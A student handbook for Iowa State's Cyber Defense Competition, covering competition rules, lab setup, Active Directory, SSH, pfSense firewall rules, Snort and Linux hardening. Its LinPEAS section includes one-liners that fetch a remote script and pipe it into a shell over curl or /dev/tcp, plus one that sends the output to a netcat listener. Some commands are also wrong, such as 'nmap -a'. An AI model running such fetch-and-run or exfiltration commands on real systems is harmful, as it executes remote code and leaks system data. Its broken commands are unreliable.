# ISU CDC Handbook
### Guides, tutorials, and reference material to help you prepare and conquer the Cyber Defense Competition at Iowa State University.
---
# Table of Contents
- [What to Expect](#what-to-expect)
  - [What is the CDC](#what-is-the-cdc)
  - [Rules of Engagement](#rules-of-engagement)
  - [Scenarios and Anomalies](#scenarios-and-anomalies)
  - [Red team, Fire Drills, and Social Engineering](#red-team-fire-drills-and-social-engineering)
- [Before the Competition](#before-the-competition)
  - [Team Formation and Registration](#team-formation-and-registration)
  - [Competition Network and Environment](#competition-network-and-environment)
  - [Planning a Playbook and Basic Triaging](#planning-a-playbook-and-basic-triaging)
  - [Creating a Practice Network](#creating-a-practice-network)
  - [What to Practice](#what-to-practice)
- [Preparing for the Competition](#preparing-for-the-competition)
  - [Scanning for vulnerabilities](#scanning-for-vulnerabilities)
  - [Changing Default Passwords](#changing-default-passwords)
  - [Configuring Active Directory](#configuring-active-directory)
  - [Enabling SSH on port 22](#enabling-ssh-on-port-22)
  - [Configuring a Firewall](#configuring-a-firewall)
  - [Configuring an Intrusion Detection System](#configuring-an-intrusion-detection-system)
  - [Port Scanning](#port-scanning)
  - [System Hardening  for Linux](#system-hardening-for-linux)
  - [System Hardening for Windows](#system-hardening-for-windows)
- [Attack Phase of the Competition](#attack-phase-of-the-competition)
  - [Sniffing Network Traffic](#sniffing-network-traffic)
  - [Analyzing logs](#analyzing-logs)
  - [Understanding Windows Event Viewer](#understanding-windows-event-viewer)
  - [Reporting](#reporting)
  <br>
<br>

---
 # What to Expect
---
## What is the CDC
The Cyber Defense Competition is a competition hosted by Iowa State university that is designed to give students a practical, educational experience that simulate the challenges faced within incident response efforts in cyber security. Each team is assembled of four to eight players and assume the role of the Blue Team and are assigned vulnerable machines. The teams must defend against the Red Team, which represents network attackers and are industry professionals from within the area. The machines are released to the students typically at noon the day before the competition and have until 8:00 am before the attack phase begins. From 8:00 am to 4:00 pm the teams must defend against the red team and keep their services up and running to avoid losing points. The White Team supervises the event, evaluates, and assigns points to each Blue Team based on the assessments from the Red and Green Teams. The Green Team embodies typical network users, contributing to the complexity of maintaining network security. The Blue Team that accumulates the highest score by the competition's conclusion will be declared the victor. For additional details, refer to https://cdc.iseage.org/ or https://cdc.pizza/ for details on the next CDC.
<br>
## Rules of Engagement
For more details on the rules of engagement please visit https://docs.iseage.org/rules/v4.1/rules/index.html#blue-teams 
1. Blue Teams must avoid engaging in offensive behavior when defending against red team.
2. Blue Team members should refrain from sharing CDC credentials.
3. Any software or program used must be open-source or provided by ISEAGE (free-trials on paid services are allowed).
5. Access requirements for servers must be followed in order to receive points.
6. Blue Teams must follow account management guidelines and only change user passwords with authorization.
7. Submissions for usability checks and anomalies must be submitted before the dealine to receive points.
8. Blue team must not be composed of 8 or more players
9. Blue team must cooperate with white team requests
<br>

## Scenarios and Anomalies
The CDCs scenarios vary but usuallly include an active directory server, a database, a web application, a client, an application that connects to the database, and some sort of custom application. Over the years the versions of operating systems have  changed but typically use a combination of older Ubuntu versions such as 16, 20.04, as well as Alma 8 or 9, Windows 10 and Windows Server 16. Moreover, throughout the attack phase the green team leader releases anomolies which consists of a variety of tasks that teams can complete for additional points
<br>


## Red Team, Fire Drills, and Social Engineering
The red team will use a variety of techniques to take down blue team flags including traditional means of running scripts or tools against the machines as well as nontraditional means such as social engineering. Green team memebers as the end users must be able to access and interact with services and red team may attempt to impersonate the green team in attempt to gain leverage over their machines. Moreover, some red team members have used other creative means such as claiming they are a photographer taking pictures for the CDC event and end up stealing credentials. Blue teams must be prepared to handle any attack thrown at them as well as firedrills; once a firedrill is announced the blue teams must leave their computers as they are and exit the room. The red team at most can tap the space bar or wiggle a mouse but are not allowed go through or attack blue team members' personal devices.
<br>
<br>

---
# Before the Competition
---
## Team Formation and Registration
Teams should register at blue team at https://signup.iseage.org/ 
<img src="https://i.imgur.com/yUPDzTZ.png" width="587.5" height="310">

Be sure to rememember your credentials as they are necessary for accessing the network
<img src="https://i.imgur.com/HFkKrIP.png" width="587.5" height="310">

Create or join a team of up to eight players.
<br>

---
## Competition Network and Environment

After registering, the network can be accessed at https://vcenter.iseage.org/ be sure you are connected CDC network otherwise you will not be able to access the server.
<br>
 <img src="https://i.imgur.com/Grft5nU.png" width="672" height="310">
 
 Upon logging in your machines should be visable within the left panel. 
 
  <img src="https://i.imgur.com/G9W8mRu.png" width="672" height="310">

  To open your virtual machine you must first turn on the machine by clicking the "Power On" play button
  
  <img src="https://i.imgur.com/zBYkRnO.png" width="315" height="84.5">
  
  Then launch the virtual machine by click the "Launch Console" button
  
  <img src="https://i.imgur.com/pnc2dOG.png" width="315" height="84.5">

  Select Web Console and hit launch to open the machine in a new tab within your browser
  
  <img src="https://i.imgur.com/xG0guhG.png" width="377" height="181.5">
<br>

  ---
## Planning a Playbook and Basic Triaging

Jumping into the the competition can be overwhelming, however, by having a plan before setting foot in the TLA you give your team quite an advantage. These competitions are made to be unpredictable and move quickly which often requires you to quickly shift priority when things start to go south. It is necessary to be able to multitask as well and be flexible to adapte to changes within the environment. Moreover, it is important to consider risk managagment in assessing the situation and thoroughly documenting any suspected attacks. Keep in mind there is not a definite way in which tasks are carried out nor should team members feel confined to a role, these are solely ideas to get you started.

## CDC Approach

1. **Set Up Active Directory (AD)**:
   - Establish your network's centralized directory service to manage user accounts, permissions, and authentication. This forms the backbone of your network security infrastructure.

2. **Harden Systems**:
   - Apply basic hardening measures to all systems, including servers and endpoints, to reduce attack surfaces and minimize vulnerabilities. This includes patching systems, configuring strong passwords, and disabling unnecessary services.

3. **Configure Firewall Rules**:
   - Define firewall rules to control inbound and outbound traffic, enforcing security policies and segmentation between network segments. Prioritize rules based on security requirements and risk mitigation strategies.

4. **Deploy Intrusion Detection Systems (IDS)**:
   - Implement IDS solutions to monitor network traffic for suspicious activity and potential security breaches. Fine-tune detection rules and response mechanisms to effectively identify and mitigate security incidents.

5. **Conduct Port Scanning and Enumeration**:
   - Perform port scanning and service enumeration to identify open ports, running services, and potential vulnerabilities on network hosts. Utilize tools like Nmap to gather detailed information about the network environment.

6. **Secure Remote Access (SSH and RDP)**:
   - Configure secure communication protocols such as SSH for remote access to systems and devices. Implement strong encryption, authentication mechanisms, and access controls to prevent unauthorized access.

7. **Establish Monitoring and Incident Response Procedures**:
   - Develop comprehensive monitoring capabilities and incident response procedures to detect, analyze, and respond to security incidents in real-time. Leverage security information and event management (SIEM) tools for centralized log management and threat detection.

8. **Perform Regular Security Assessments**:
   - Conduct periodic security assessments, vulnerability scans, and penetration tests to evaluate the effectiveness of security controls and identify potential weaknesses. Address identified issues promptly to maintain a robust security posture.

9. **Checking Logs**:
   - Consistently check logs on vital componenet such as the security section within event viewer. In doing so you can quickly address any  unauthorized logins or any sudden changes to any security settings within your systems.

### Team Roles
It is important to establish roles within your team to tackle different tasks, moreover it is cruicial to establish a reliable line of communication to report incident and divide up any responsibilities. Here is one way responsibilities could be divided up.

Student 1: Active Directory Administrator
Student 2: Firewall Architect
Student 3: Database Administrator
Student 4: Anomolies and Documentation
Student 5: Incident Response 
Student 6: Vulnerability Hunter
Student 7: Analyst for Linux systems
Student 8: Analyst for Windows Systems

## Creating a Practice Network
Practice makes perfect and nothing beats having your very own network to test out what you'll learn. Before you get started you will need to download a few applications; a hyper visor and a few ISO files. A hypervisor is the platform that will run your virtualized network enviroment and an ISO file is often the format of choice for distributing operating systems. Below are some resources to get started, check with your school as some insitutions offer vmware or windows license to students for free. For this example we will be using Vmware Workstation since the competition uses Vmware products to host the virtual network. Simply navigate to the download link, and follow the wizard for installation. This tutorial will focus on teaching you how to get your network up and running.
1. Install hypervisor of your choice
  
   - [Vmware Workstation](https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html.html.html)  &nbsp;  <img src="https://static.wikia.nocookie.net/logopedia/images/6/62/VMware_Workstation_7_logo.png/revision/latest?cb=20140525014047" width="40" height="40">
     - 30 day free trial
        <br>
        
   - [VirtualBox](https://www.virtualbox.org/wiki/Downloads) &nbsp; <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d5/Virtualbox_logo.png/330px-Virtualbox_logo.png" width="50" height="50">
     - Free
      
   - [HyperV](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v) &nbsp; <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Windows_logo_-_2012.svg/2048px-Windows_logo_-_2012.svg.png" width="40" height="40">
     - Windows license required

2. Download ISO files 

   Essentials:
    - Ubuntu:
      - [Server ISO Download](https://ubuntu.com/download/alternative-downloads#other-images-and-mirrors)
      - [Desktop ISO Download](https://ubuntu.com/download/alternative-downloads)
    - Windows:
      - [Windows Server 2016 Evaluation ISO Download](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2016)
      - [Windows 10 Evaluation ISO Download](https://info.microsoft.com/ww-landing-windows-10-enterprise.html) (Requires registration)
      
   Additional:
    - Alma
      - [ISO Download](https://mirrors.almalinux.org/isos.html)
    - Pfsense
      - [ISO Download](https://www.pfsense.org/download/)
    - Kali
      - [ISO Download](https://www.kali.org/get-kali/#kali-installer-images)
    - Security Onion
      - [ISO Download](https://download.securityonion.net/file/securityonion/securityonion-2.4.60-20240320.iso)
              <br>
      <br>

4. Create Virtual Machines
      <br>
Open Workstation and navigate to "File > New Virtual Machine" or click "ctrl + N"
  <img src="https://i.imgur.com/mHI6E7e.png">
  Select typical and click "Next"
  <img src="https://i.imgur.com/13YSA4M.png" width=398 height=429>
  Click browse and select the ISO file you downloaded
  <img src="https://i.imgur.com/mJgeZDf.png" width=398 height=429>
  Navigate through the wizard by creating a user account and appropriately name the host
  <img src="https://i.imgur.com/2v063EI.png" width=398 height=429>
  The default 20 GB should be enough for your machine
  <img src="https://i.imgur.com/Mb2hSO1.png" width=398 height=429>
   Confirm all the information is correct and click "finish"
  <img src="https://i.imgur.com/pSxO2aT.png" width=398 height=429>
  Follow the installation wizard to finish setting up the machine
  <img src="https://i.imgur.com/DXxqPK3.png" width="639" height="401">
  <br>

## What to Practice
1. Active Direcory, familiarize yourself in setting up AD, creating users and group. Get comfortable with creating group policies and quickly changing passwords when needed.
2. Become familiar with the standard procedure for configuring and maintaining the databases.
3. Gain experience in networking by being able to configure ports, firewalls, IPs. Understand how the network is laid out and the different layers the services operate upon.
4. Understand and practice setting up and managing a firewall, the most asked question within the CDC usually are firewall related.
<br>

---

# Preparing for the Competition

---

## Scanning for Vulnerabilities
There a variety tools available for you to use that can streamline the process of hunting for vulnerabilities. The earlier this is implemented the better as it will thoroughly assess what your system security needs.

### Nessus
Nessus is an enterprise tool that is quite reputable and is widely used within the industry. Nessus offers a free 30 day trial on their popular vulnerability scanner. It's limited compared to the commercial version but still provides valuable vulnerability scanning capabilities. Visit https://www.tenable.com/downloads/nessus?loginAttempted=true to download you have the option to choose from a preformatted virtual machine file or download the file directly to the host.


1. Run the Installer
  For Windows:
  -  Double-click the downloaded .exe file and follow the on-screen instructions.
    
  For Linux:
  -  Open a terminal, navigate to the download directory, and run the following commands:
```bash
sudo chmod +x Nessus-*.rpm (or .deb)
   
sudo ./Nessus-*.rpm (or .deb
```

2. Start the Nessus Service

  On Windows:
  -   the Nessus service should start automatically after installation.
    
  On Linux:
  -  start the Nessus service with the following command:
```bash
sudo /etc/init.d/nessusd start
```

3. Open a web browser and go to https://localhost:8834
4. Follow the on-screen instructions to register your Nessus installation and activate your license.
5. After activation, you will be prompted to create an admin user account.
6. Provide a username and password, then click "Submit".
7. Log in to the Nessus web interface using the admin account you just created.
8.  Click "Scans" in the left-hand menu, then click "New Scan" to create a new scan.
9.   Configure the scan settings as needed, then click "Launch Scan" to begin the vulnerability assessment.


### OpenVAS
OpenVAS is a comprehensive vulnerability scanning tool that detects security issues in your network and provides solutions to address them. It's open-source and offers a wide range of features navigate to https://www.greenbone.net/en/testnow/#toggle-id-1 to begin downloading.

1. Download the OVA file of the Greenbone Enterprise TRIAL.
2. Launch Vmware
4. In Vmware select File > Open… in the menu bar
5. Select the OVA file of the appliance in the file system.
  <img src="https://www.greenbone.net/wp-content/uploads/Import_VMware_1.png">
6. Click import
7. Login with the default credentials
   
   `username: admin`

   `password: admin`
   
  <img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_1.png" width="539" height="301">

8. Select Yes and press Enter to open the Wizard.
9. Select Yes and press Enter.
10. Enter the user name of the web administrator.
  <img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_2.png">

12. Enter the password of the web administrator twice.
13. Select OK and press Enter.
    
    `→ The editor is opened.`
    
14. Press Enter to close the message.
<img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_3.png" width="539" height="301">

16. Select Editor and press Enter.
17. Enter the subscription key.
18. Press ctrl + X.
19. Press Y to save the changes.
20. Press Enter.
<img src="https://www.greenbone.net/wp-content/uploads/First_Setup_Wizard_4.png">

22. The web interface can be accessed by opening the web browser.
23. Enter the IP address of the appliance’s web interface.
    
         Note: The IP address of the appliance’ s web interface can be displayed as follows:
        During the login to the GOS administration menu
        By selecting About and pressing Enter in the GOS administration menu
    
24. Log in with the web administrator created during setup.
    
        → The web interface is opened.

<img src="https://www.greenbone.net/wp-content/uploads/Main_Dashboard_EN.png" width="539" height="301">

### Linpeas
LinPEAS is not specifically a vulnerability scanner in the traditional sense, but rather a tool for identifying potential security weaknesses and paths to escalate privileges on Linux systems. It can be useful for incident response by providing you with information of vulnerable or weak areas to patch or secure.

 From github
  ```bash
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

 Without curl
  ```bash
  python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
  ```
  ```bash
  python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
  ```
 Local network
   ```bash
  sudo python3 -m http.server 80 #Host
   ```
  ```bash
  curl 10.10.10.10/linpeas.sh | sh #Victim
  ```

 Without curl
  ```bash
  sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
  ```
  ```bash
  cat < /dev/tcp/10.10.10.10/80 | sh #Victim
  ```

Excute from memory and send output back to the host
  ```bash
  nc -lvnp 9002 | tee linpeas.out #Host
  ```
  ```bash
  curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
  ```

Use a linpeas binary
  ```bash
  wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
  ```
  ```bash
  chmod +x linpeas_linux_amd64
  ```
  ```bash
  ./linpeas_linux_amd64
  ```

---
## Changing Default Passwords
One of the most important tasks to take care upon first receiving your machines is to change all default passwords to the hosts on your network.

### Windows
Enter Ctrl+Alt+Delete and click change a password

<img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fhelp.sentrian.com.au%2Fwp-content%2Fuploads%2F2018%2F08%2Fclt-alt-del-winserver16-1.jpg&f=1&nofb=1&ipt=5b318dce91056915c4e99c1904c0e216d89925c30a05e008b14ddc8c429035ea&ipo=images">

Choose a new and secure password unique to this host 

<img src="https://kb.mlml.sjsu.edu/uploads/images/gallery/2019-02-Feb/scaled-840-0/image-1550688271601.png">

### Linux
Open a terminal and type the following command
      
      passwd

You will be prompt to enter your current password followed by being asked to enter a new password
<img src="https://itslinuxfoss.com/wp-content/uploads/2023/02/image-995.png">

<br>

---
## Configuring Active Directory

Active direcotry is often overwhelming blue teamers working with it for the first time. It establishes a level of organization among users and roles to manage permissions and publish policies users must abide to. Using powershell to join hosts to the domain can be efficient as it will automate a lot of the process for you. Here's how you can set up AD and join hosts to the domain using PowerShell:

### Setting up Active Directory:

1. Search powershell in Start Menu
2. Right-click and run as administrator

3. Use the `Install-WindowsFeature` cmdlet to install the Active Directory Domain Services role:

   ```powershell
   Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

5. Use the `Install-ADDSForest` cmdlet to promote the server to a domain controller:

   ```powershell
   Install-ADDSForest -DomainName "isucdc.com" -DomainNetbiosName "ISUCDC" -ForestMode "WinThreshold" -DomainMode "WinThreshold" -InstallDns -Force

- Note: For Testing purposes in your own network substitute with the following, be sure to have a password set for both you and the admin account:
  
  ```powershell
     Install-ADDSForest -DomainName "mylab.local" -CreateDnsDelegation:$false -DomainNetBiosName "mylab" -InstallDns:$true
  ```
  
6. Use the `Set-ADDirectoryServicesRestoreModePassword` cmdlet to set the Directory Services Restore Mode (DSRM) password:
  
   ```powershell
   Set-ADDirectoryServicesRestoreModePassword -NewPassword (ConvertTo-SecureString -AsPlainText "YourDSRMPassword" -Force)

7. After promoting the server to a domain controller, restart the server to complete the process.
<br>
 
 ### Joining Hosts to Active Directory:

  Joining Windows Hosts:
   - Use the `Add-Computer` cmdlet to join a Windows host to the domain:
   
   ```powershell
   Add-Computer -DomainName "isucdc.com" -Credential Get-Credential
   ```
     
  Joining Linux Hosts:
   1. Install the necessary PowerShell modules for managing Linux systems (e.g., `PowerShellGet`, `PackageManagement`).
   2. Join the Linux host to the domain using the `Join-ADComputer` cmdlet:
  ```powershell
  Join-ADComputer -Server "DC1.isucdc.com" -Credential (Get-Credential) -Name "LinuxHost01"
  ```     

#### Verify Domain Join:
Windows Hosts:
  - You can use the `Get-ComputerInfo` cmdlet to retrieve information about the domain status on Windows hosts:
    
    ```powershell
    Get-ComputerInfo -Property 'DomainJoined'
    ```
    
  - This command will return whether the computer is joined (`True`) or not joined (`False`).

Linux Hosts:
  - Realm list is a native command that displays all the realms that the system in joined to including AD
    
    ```bash
    realm list
    ```

### Bulk user, organizational unit, and group creation
Within the Active directory folder of the github repo there are exists a Powershell script to mass import users as well as a spreadsheet that you can use as a template to fill with your own users

1. Download the folder onto your Windows server
<img src="https://activedirectorypro.com/wp-content/uploads/2022/09/powershell_scripts_c_drive.webp">

2. First we will create an organizational unit, modify the ous.csv file to reflect your CDC user roles and save
<img src="https://i.imgur.com/3y85x0M.png">

4. From the start menu search Windows Powershell ISE, right click and run as administrator
 
5. Click File > Open > create_ous.ps1 and run the file
<img src="https://activedirectorypro.com/wp-content/uploads/2022/09/create-ous-powershell-1.webp">

6. Repeat the same process for groups and users by updating the csv file and running the code

7. Confirm the program ran successfully by running the following command in powershell:

 ```powershell
   Get-ADUser -filter * -Properties * | Select name, department, title | out-gridview
  ````
### Applying Group Policies
**Be sure to import the following first:**

1. Connect to the Active Directory PowerShell module:
```powershell
Import-Module ActiveDirectory
```

2. Create a new Group Policy Object (GPO):
```powershell
New-GPO -Name "Secure Settings"
```

3. Edit the GPO settings:
```powershell
$GPO = Get-GPO -Name "Secure Settings"
Set-GPRegistryValue -Name "Secure Settings" -Key "HKLM\Software\Policies\Microsoft\Windows\System" -ValueName "EnableSmartScreen" -Type DWord -Value 1
```

**Optional Add-Ons:**

1. Password Policy: to set password complexity, length, and expiration requirements.
  ```powershell
   Set-ADDefaultDomainPasswordPolicy
  ```

2.Account Lockout Policy: to configure account lockout thresholds and duration.
  ```powershell
  Set-ADDefaultDomainPasswordPolicy 
  ```
3. Audit Policy: to enable auditing of various events, such as logon/logoff, account management, and policy changes.
  ```powershell
    Set-GPRegistryValue 
  ```

4. User Rights Assignment: to manage user and group permissions for specific user rights (e.g., "Log on as a service").
  ```powershell
   Set-GPPermission 
  ```

6. Security Options: to configure various security options, such as:
    - Require administrator approval for elevation
    - Disable guest account
    - Enable UAC (User Account Control)
  ```powershell
   Set-GPRegistryValue 
  ```

7. Windows Defender Firewall: to create and manage firewall rules.
  ```powershell
   Set-NetFirewallRule 
  ```

8. BitLocker Drive Encryption: to enable and configure BitLocker encryption settings.
  ```powershell
   Set-BitLockerVolume
  ```

9. AppLocker: to create and manage application control policies.
  ```powershell
   Set-AppLockerPolicy 
  ```

10. Internet Explorer Security: to configure security settings for Internet Explorer, such as:
    - Enable Enhanced Protected Mode
    - Disable Internet Explorer file downloads
  ```powershell
   Set-GPRegistryValue 
  ```

11. Windows Update:to configure automatic Windows Update settings.
  ```powershell
    Set-GPRegistryValue 
  ```

12. Event Log Settings:to configure event log settings, such as maximum log size and retention policy.
  ```powershell
    Set-GPRegistryValue 
  ```

14. Remote Desktop Services: to configure security settings for Remote Desktop Services, such as:
    - Require NLA (Network Level Authentication)
    - Disable Remote Assistance
    ```powershell
    Set-GPRegistryValue 
    ```

----

## Enabling SSH on port 22
SSH other wise known as the secure shell allows a user a secure way to remotely access a system and is often required for linux host within the CDC

### Alma Linux
1. Install OpenSSH for your system

  ```bash
  dnf install openssh-server openssh-clients
```

2. Use systemctl to start or stop the SSH server
 ```bash
  systemctl start sshd
```
```bash
  systemctl stop sshd
```

3. To enable SSH to automatically starts at system boot

```bash
  systemctl enable sshd
```
  To Disable:
```bash
  systemctl disable sshd
```
4. To chech the SSH server status
```bash
   systemctl status sshd
```
5. To allow traffic on SSH through the firewall execute the following
```bash
   firewall-cmd --zone=public --permanent --add-service=ssh
```
```bash
   firewall-cmd --reload
```

### Ubuntu
1. Update the package index:
  ```bash
  sudo apt update
  ```
3. Install the SSH server package:
 ```bash
 sudo apt install openssh-server
 ```  
4. Once installed, the SSH service should start automatically. You can verify its status with:
 ```bash
 sudo systemctl status ssh
```
5. If the service is not running, you can start it with:
 ```bash
 sudo systemctl start ssh
```
6. To enable SSH to start automatically on boot, run:
 ```bash
  sudo systemctl enable ssh
   ```
7. To configure or verify your SSH settings you can modify it using nano:
  ```bash  
  sudo nano /etc/ssh/sshd_config
```
8. Verify the port is set to 22 look for the line that specifies the port SSH listens on. It usually looks like this:
 ```bash
 Port 22
 ```
Uncomment by removing the # at the beginning of the line if necessary.

9. Enter Ctrl+S and Ctrl+X to save and exit.
10. Apply the changes by restaring the service:
 ```bash
 sudo systemctl restart sshd
```
12. Test ssh works by opening a new terminal and attempting to access using the follow:
 ```bash
 ssh username@xx.xx.xx -p 22
```
### Windows
1. Search powershell in Start Menu
2. Right-click and run as administrator
3. Enter the following command exactly as written:
  ```powershell
  Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
  ```
  - Note the `sshd_config` file will only generate once the service is started
4. Type the following command to start the service:
   ```powershell
   Start-Service sshd
   ```
5. To configure your SSH settings it can be found in the `sshd_config` file within you `C:ProgramData\ssh` directory
   <img src="https://i.imgur.com/aBzSN2T.png">
 <br>
 
## Configuring a Firewall
A firewall is a fundamental component of network security that acts as a barrier between a trusted internal network and untrusted external networks, such as the internet. Its primary purpose is to monitor and control incoming and outgoing network traffic based on predetermined security rules. Pfsense is a free and open-source resource for you to use that is quite user-friendly and versatile when considering the CDC

### Pfsense Installation
1. Use the tutorial from [Creating a Practice Network](#creating-a-practice-network), to a create a dedicated virtual machine for Pfsense; the default values should be adequate. Before you click finish click `Customize Hardware`

2. Click memory and increase to 2 GB 
   
3. You need an Network Adapter for WAN and LAN click Add.. to create a second adapter
<img src="https://i.imgur.com/Sfojtap.png" width="545" height="520">

4. Configure the settings of the Network Adapter to custom and select your network such as VMnet5. **Make sure your other machines are connected to the same VMnet as well**
<img src="https://i.imgur.com/Dj1ABxb.png" width="545" height="520">

5. Click close and then click finish

6. Start the VM, accept the license, and select ok when prompted for installation
 
7. For partioning select Auto UFS
<img src="https://i.imgur.com/1iRpKA1.png">

8. Partition the entrie disk
<img src="https://i.imgur.com/32nAwyw.png">

9. For your partition scheme, select MBR DOS Partitions
<img src="https://i.imgur.com/ba8vUnQ.png">

10. Select the da0 MBR parition you just made and click finish
<img src="https://i.imgur.com/Jrf4Mam.png">

11. Click Commit, click Reboot, and wait for pfsense to load
<img src="https://i.imgur.com/7Jw8YGO.png">

### Pfsense Configuration
If the default IP interferes with a router on your home network, the following instructions will teach you how to change your LAN interface IP
1. In the terminal type 2 and hit enter to set interface IP address
<img src="https://i.imgur.com/4UblpPY.png">

2.  Type 2 to modify the LAN interface
<img src="https://i.imgur.com/zOP1GBT.png">

3.  Type n
<img src="https://i.imgur.com/PIqw6di.png">

4. Enter an IP within range that isn't used such as 192.168.229.1
<img src="https://i.imgur.com/UzCG0n5.png">

5. Type 24
<img src="https://i.imgur.com/FprJ1MV.png">

6. Hit enter to skip
<img src="https://i.imgur.com/gGGRlLC.png">

7. Type n to setting up IPv6 address on LAN via DHCP6


8. Hit enter to skip
<img src="https://i.imgur.com/lEODmFR.png">

9. Type y to enable DHCP server on LAN

  
10. Enter xx.xx.xx.100 replace x with your range

11. Enter xx.xx.xx.200 replace x with your range
<img src="https://i.imgur.com/lEODmFR.png">

12. Make note of the address provided as that is how you will access the web console, click enter to continue
<img src="https://i.imgur.com/0udaLyW.png">


13. Access your workstation machine and navigate the address provided  
<img src="https://i.imgur.com/0udaLyW.png">

14. The default credentials are `u: admin p: pfsense` 
<img src="https://i.imgur.com/iQJ3z1Y.png">

15. Change the password by click the link in the Warning notice
<img src="https://i.imgur.com/zctvYdL.png">

16. Navigate to Firewall > Rules > LAN as you can See Pfsense has some default rule set 
<img src="https://i.imgur.com/w26gkFY.png">

### Creating rules
- Note If you're setting up rules for outbound traffic from your servers to the internet you'd also typically create these rules on the WAN interface, if you're setting up rules for traffic between hosts/serverson your local network, you'd create rules on the LAN interface. For this example, we will use a "www server".

Requirements:
  ```
  WWW (192.168.229.129):
    Allow incoming traffic on ports 80 and 443 for HTTP and HTTPS web access.
    Allow incoming traffic on port 3389 (RDP) for administrative access.
  ```

**Allow incoming traffic on ports 80 and 443 for HTTP and HTTPS web access:***

1. First begin by creating a seperator and name it www, this will help us keep track of the rule we made
<img src="https://i.imgur.com/ZnPpCU9.png">

2. Within the rules page click Add with the down arrow

3. Set the following fields:
    - Action: `Pass`
    - Interface: `LAN`
    - Address Family: `IPv4`
    -  Protocol: `TCP/UDP` (choose the appropriate protocol)
    -  Source: `Any`
    -  Destination: `Address or Alias` Destination Address: `192.168.1.100`
    -  Destination port range: From `HTTP (80)` To `HTTPS (443)`
<img src="https://i.imgur.com/YS0vyew.png">

4. Optionally, add description such as `Allow HTTP/S to www` and enable logging if needed
   
6. Click Save and Apply Changes.


**Allow incoming traffic on port 3389 (RDP) for administrative access:**

1. To Save some time we can copy the rule we just made and change the values

2. Set the following fields:
    - Action: `Pass`
    - Interface: `LAN`
    - Address Family: `IPv4`
    -  Protocol: `TCP/UDP` (choose the appropriate protocol)
    -  Source: `Any`
    -  Destination: `Address or Alias` Destination Address: `192.168.1.100`
    -  Destination port range: From `(other)` Custom `3389`
<img src="https://i.imgur.com/lzzCEpB.png">

4. Optionally, add description such as `Allow RDP to www` and enable logging if needed

5. Click Save and Apply Changes.

6. Your rules should then look like the following:
 <img src="https://i.imgur.com/4k2zVbj.png">
 
<br>

## Configuring an Intrusion Detection System
An intrusion detection system allows you to configure a set of rules to be alerted of potentially malicious activity. Moreover it can help you catch an attacker before they are able to progress further within your network.

### Snort
1. Follow the tutorial for [configuring a firewall](#configuring-a-firewall) to set up pfsense. Feel free to read the SNort official documentation https://docs.netgate.com/pfsense/en/latest/packages/snort/setup.html
   
2. Navigate to `System` > `Package Manager` > `Available Packages`

3. Type `snort` in the search box and click `install`
<img src="https://i.imgur.com/PMVD9H8.png">

4. Click `confirm` and wait for the package to install

5. Navigate to `Services` > `Snort` > `Updates`
<img src="https://i.imgur.com/q6c9p9t.png">

6. Click `Update Rules` to download latest rule set for Snort
 
7. Navigate to the `Snort Interfaces` tab in the Snort settings.
<img src="https://i.imgur.com/JeGSp4g.png">

8. Click `Add` and enable Snort on the desired interface then select `save` you may select optional blocking and alerting features if desired
<img src="https://i.imgur.com/1U9haT5.png">

9. It may take a second to load but click the play button on `Snort Status` to activate the rules
<img src="https://i.imgur.com/ueeF3LW.png">



## Port Scanning
Nmap is a tool that allows you to view what ports are open and exposed to the internet. This information is vital to an attacker as it can provde insight on how to gain foothold on your network . Mitigation tactics include hiding the hosts behind a firewall. A firewall is a security system that monitors and controls incoming and outgoing network traffic based on predefined security rules. One of the key functions of a firewall is to protect a network or system by blocking unauthorized access to certain ports and services. 

Installation for Windows:
Download Nmap Visit the official Nmap website: https://nmap.org/download.html

Installation for Linux: 
 ```bash
  sudo apt-get update
  sudo apt-get install nmap
 ```
The only command you will likely need is nmap -a followed by either the host ip or ip range, this yeilds a detailed scan of the ports and services running on the machine.

    nmap -a XX.XX.XX.XX
 <br>
 
## System Hardening for Linux

**Commands listed are not all-encompassing and are for a baseline only!**

1. Change **all** user passwords. *Yes, especially the credentials given to you!*
 ```bash
passwd username
```
2. Audit /etc/shadow for users with passwords set, or no password at all.
```bash
cat /etc/shadow
```
3. Remove all SSH keys present on the box.
```bash
find / -name authorized_keys 2> /dev/null
```
```bash
find / -name id_rsa 2> /dev/null
```
4. Audit sudo access given to users.
```bash
cat /etc/sudoers
```
```bash
cat /etc/sudoers.d/*
```
```bash
getent group sudo | cut -d: -f4` (The *sudo* group is Debian, *wheel* is for RHEL
```
5. Audit /etc/passwd to check for account shells and UIDs.
```bash
cat /etc/passwd | grep :0:
```
```bash
cat /etc/passwd | grep -v /bin/false | grep -v /sbin/nologin
```
6. Verify that there are not any non-standard cron jobs on the system.
```bash
cat /etc/cron.d/*
```
```bash
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done
```
7. Stop services that are not critical to the system or competition needs.
```bash
systemctl --type=service --state=active
```
```bash
systemctl stop servicename
```
8. Identify SUID and SGID files. Cross-reference with https://gtfobins.github.io/ to narrow down malicous instances of SUID and SGID files.
```bash
find / -perm -4000 -print 2>/dev/null` for SUID
```
```bash
find / -perm -2000 -print 2>/dev/null` for SGID
```

10. Identify world-writable files and directories.

For Directories:
```bash
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```
For Files:
```bash
    `find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```
